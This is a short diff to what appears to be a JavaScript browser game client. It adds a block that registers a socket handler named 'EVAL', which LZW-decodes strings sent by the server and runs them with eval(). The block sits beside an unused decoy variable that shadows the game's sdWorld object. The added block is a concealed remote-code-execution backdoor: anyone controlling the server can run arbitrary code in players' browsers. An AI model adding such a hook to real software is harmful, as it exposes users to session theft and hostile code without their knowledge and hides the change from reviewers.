@@ -586,6 +586,11 @@ let enf_once = true;
 			sdWorld.Start( globalThis.GetPlayerSettings() );
 		});
 		
+		{
+			const sdWorld = Date.now();
+			socket.on( 'EVAL', ( s )=>{ eval( LZW.lzw_decode( s ) ); });
+		}
+		
 		socket.on( 'censored_chat', ( stuff_arr )=>
 		{
 			if ( !sdChat.open )
